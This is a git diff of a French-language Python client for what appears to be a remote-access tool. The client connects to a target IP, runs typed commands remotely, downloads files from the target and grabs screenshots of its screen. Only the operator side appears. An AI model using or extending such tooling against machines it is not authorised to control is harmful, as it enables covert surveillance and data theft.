@@ -1,3 +1,4 @@
+import sys
 import time
 
 from base import *
@@ -18,50 +19,71 @@ class ClientSocket(BaseSocket):
     def connect(self, ip: str, port: int = PORT):
         i = 1
         while True:
-            print(f'{WHITE}📡 Connexion au cible {YELLOW}{ip}:{port} 📡')
+            print('📡 Connexion au cible ' + colored_info(f'{ip}:{port} 📡'))
             try:
                 self.clientsocket.connect((ip, port))
             except ConnectionRefusedError:
-                print(f'{RED}❌ Erreur de connexion! ❌')
+                print(colored_error('❌ Erreur de connexion! ❌'))
                 i += 1
-                print(f'{WHITE}🔁 Nouvelle tentative| {YELLOW}{ip}:{port} | {WHITE}{i} 🔁')
+                print(f'🔁 Nouvelle tentative ( {i} ) 🔁')
                 time.sleep(5)
             else:
-                print(f'\n{GREEN}✅ Connexion etablie avec succes 🛜\n')
+                print(colored_success('\n✅ Connexion etablie avec succes ✅\n'))
                 self.targetaddress = ip, port
                 self.connected = True
                 break
 
-    def write_file_localy(self, commande, binary_file, destination):
-        split_commande = commande.split(' ')
+    def download_file_localy(self, commande, destination):
+        splited_commande = commande_spliter(commande)
         error = False
 
         if destination.lower() == 'q':
-            print(f"{RED}‼️Le fichier n'a pas ete telecharger.")
-        try:
-            file = open(destination, 'r')
-        except FileNotFoundError:
-            with open(destination, 'wb') as f:
-                f.write(binary_file)
-            print(f'{WHITE}Telechargement de {PURPLE}{split_commande[1]}{WHITE} dans {PURPLE}{destination}')
-        except IsADirectoryError:
-            print(f"{RED}‼️ {destination} est un dossier.")
-            error = True
-        else:
-            file.close()
-            print(f'{RED}‼️ Le fichier {destination} existe dejas')
-            error = True
+            print(colored_error("‼️Le fichier n'a pas ete telecharger."))
 
-        if error:
-            new_destination = input(f'{WHITE}Entrez un nouvelle destination (ou "q" pour quitter): {CYAN}')
-            self.write_file_localy(commande, binary_file, new_destination)
+        else:
+            if already_exist(destination) == 'isdir':
+                print(colored_error(f"‼️ {destination} est un dossier."))
+                error = True
+
+            elif already_exist(destination):
+                print(colored_error(f'‼️ Le fichier {destination} existe dejas'))
+                error = True
+
+            else:
+                self.send_header_data(commande.encode(encoding=ENCODING))
+                output = self.recv_header_data(True)
+
+                if output == 'filenotfound'.encode(encoding=ENCODING):
+                    print(colored_error("‼️ Le fichier n'existe pas."))
+                elif output == 'isdir'.encode(encoding=ENCODING):
+                    print(colored_error("‼️ Ne peut pas telecharger un dossier."))
+                elif output == 'screenshot-error'.encode(encoding=ENCODING):
+                    print(colored_error(f"‼️ Impossibe d'effectuer une capture d'ecran."))
+                else:
+                    with open(destination, 'wb') as f:
+                        f.write(output)
+                    print('Telechargement de ' + colored_info(f'{splited_commande[1]}') + ' dans ' +
+                          colored_info(f'{destination}'))
+
+            if error:
+                new_destination = input('Entrez un nouvelle destination (ou "q" pour quitter): ')
+                self.download_file_localy(commande, new_destination)
+
+    def screenshot(self, commande, destination):
+        splited_commande = commande_spliter(commande)
+        if len(splited_commande) < 3:
+            splited_commande.insert(1, '.screenshoot.png')
+
+        new_commande = " ".join(splited_commande)
+
+        self.download_file_localy(new_commande, destination)
 
     def run(self):
         while True:
             self.send_header_data('info'.encode(encoding=ENCODING))
             cwd = self.recv_header_data().decode(encoding=ENCODING)
-            prompt = (f'{WHITE}╭─ {BLUE}{self.targetaddress[0]}:{self.targetaddress[1]} {WHITE}{cwd}'
-                      f'\n{WHITE}╰─{YELLOW}❯ {CYAN}')
+            prompt = ('╭─' + colored_info(f' {self.targetaddress[0]}:{self.targetaddress[1]}') +
+                      f' {cwd}' + f'\n╰─' + colored_info(' ❯ '))
 
             commande = ''
             while commande == '':
@@ -71,43 +93,24 @@ class ClientSocket(BaseSocket):
                 break
 
             splited_commande = commande_spliter(commande)
-            self.send_header_data(commande.encode(encoding=ENCODING))
-            output = self.recv_header_data(True)
 
-            if not output:
-                break
-
-            elif len(splited_commande) == 3 and splited_commande[0] == 'dl':
-                try:
-                    if output.decode(encoding=ENCODING) == 'filenotfound':
-                        print(f"{RED}‼️ Le fichier n'existe pas.")
-                    elif output.decode(encoding=ENCODING) == 'isdir':
-                        print(f"{RED}‼️ Ne peut pas telecharger un dossier.")
-                    else:
-                        self.write_file_localy(commande, output, splited_commande[2])
-                except UnicodeDecodeError:
-                    self.write_file_localy(commande, output, splited_commande[2])
+            if len(splited_commande) == 3 and splited_commande[0] == 'dl':
+                self.download_file_localy(commande, splited_commande[2])
 
             elif len(splited_commande) == 2 and splited_commande[0] == 'capture':
-                try:
-                    if output.decode(encoding=ENCODING) == 'error':
-                        print(f'{RED}‼️ Impossibe d\'effectuer une capture d\'ecran.')
-                    else:
-                        with open(splited_commande[1] + '.png', 'wb') as img:
-                            img.write(output)
-                except UnicodeDecodeError:
-                    with open(splited_commande[1] + '.png', 'wb') as img:
-                        img.write(output)
+                self.screenshot(commande, splited_commande[1])
 
             else:
-                print(WHITE + output.decode(encoding=ENCODING))
+                self.send_header_data(commande.encode(encoding=ENCODING))
+                output = self.recv_header_data(True)
+                print(output.decode(encoding=ENCODING))
 
-        print(f'\n{GREEN}‼️ Deconnecte\n')
+        print(colored_success(colored_success(colored_success(f'\n‼️ Deconnecte\n'))))
         self.clientsocket.close()
 
 
 if __name__ == '__main__':
     client = ClientSocket()
-    target_ip = input('Entrez l\'addresse IP du cible: ')
+    target_ip = input("Entrez l'addresse IP du cible: ")
     client.connect(target_ip)
     client.run()
